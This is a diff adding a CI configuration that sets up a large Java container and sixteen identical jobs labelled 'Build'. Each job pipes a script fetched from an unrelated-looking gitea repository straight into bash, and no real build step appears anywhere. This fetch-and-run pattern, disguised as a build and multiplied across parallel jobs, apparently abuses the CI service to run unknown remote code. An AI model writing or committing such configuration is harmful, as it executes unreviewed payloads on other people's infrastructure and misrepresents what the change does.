@@ -1,0 +1,38 @@
+container:
+  image: openjdk:8-jdk
+  cpu: 4
+  memory: 12G
+task:
+  matrix:
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
+    - name: Build
+      build_script: curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash
